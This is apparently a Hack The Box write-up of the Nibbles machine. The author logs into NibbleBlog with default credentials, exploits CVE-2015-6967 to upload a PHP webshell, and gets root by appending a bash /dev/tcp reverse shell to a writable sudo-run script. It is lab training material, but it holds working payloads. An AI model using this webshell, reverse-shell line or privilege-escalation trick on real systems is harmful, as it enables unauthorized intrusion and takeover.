---
layout: post
title: "HTB: Nibbles"
subtitle: "default NibbleBlog creds to a plugin file upload shell, then a writable sudo script to root"
date: 2023-02-02
tags: [htb, linux, file-upload, sudo, privilege-escalation]
category: writeups
kind: machine
tldr: "A hidden /nibbleblog directory runs NibbleBlog 4.0.3 with admin:nibbles. The My Image plugin lets me upload a PHP file with no checks for a reverse shell as nibbler. sudo -l shows a writable, root-run monitor.sh, so I append a shell and run it for root."
---

## the box

Nibbles is an old retired Linux box. nmap:

```
22/tcp open  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

The homepage just says "Hello World", but the source has a comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

## recon

Directory busting `/nibbleblog/` revealed an admin panel and config files:

```
/nibbleblog/admin.php
/nibbleblog/content/private/users.xml
/nibbleblog/content/private/config.xml
/nibbleblog/README
```

The README identifies the CMS as NibbleBlog 4.0.3 (codename Coffee). I formatted the XML to read it:

```bash
curl -s http://10.129.165.135/nibbleblog/content/private/config.xml | xmllint --format -
```

`users.xml` confirmed the username is `admin`, and `nibbles` showed up repeatedly across the config, a good guess for the password. `admin:nibbles` logged into the panel. One thing to watch: NibbleBlog records failed logins in `users.xml` as a per-IP blacklist with timestamps, so blind brute forcing locks you out fast. The box name guess landed on the first try and avoided that.

## foothold

NibbleBlog 4.0.3 has a known arbitrary file upload in the My Image plugin, CVE-2015-6967. It does not check the uploaded file type, so I uploaded a PHP file directly through the plugin config page:

```
http://10.129.165.135/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
```

The plugin always saves the upload as `image.php` regardless of the name I gave it, at a predictable path, so I could reach my shell at:

```
http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php
```

I uploaded a one-liner webshell first to get command execution, then upgraded to a reverse shell:

```php
<?php system($_REQUEST['cmd']); ?>
```

```bash
curl 'http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php?cmd=id'
```

From there a standard mkfifo reverse shell landed me as `nibbler`. The user flag sits in `/home/nibbler/user.txt`.

## user

The shell runs as `nibbler`, who owns the user flag in their home directory.

## root

`sudo -l` as nibbler:

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The script is in nibbler's own home, so it is writable. I appended a reverse shell to it instead of overwriting it:

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.32/4444 <&1'" >> monitor.sh
sudo ./monitor.sh
```

The script runs as root, the appended line fires my shell, and the listener catches a root session. That is the root flag.

## takeaway

Nothing exotic here, just a stack of small misconfigurations: a "nothing interesting" comment pointing at the real app, a CMS password equal to the box name, an upload plugin that trusts the extension, and a root-run script living in a user-writable path. The only careful move worth keeping is appending rather than overwriting the sudo script, so you do not break the thing you need to keep running.
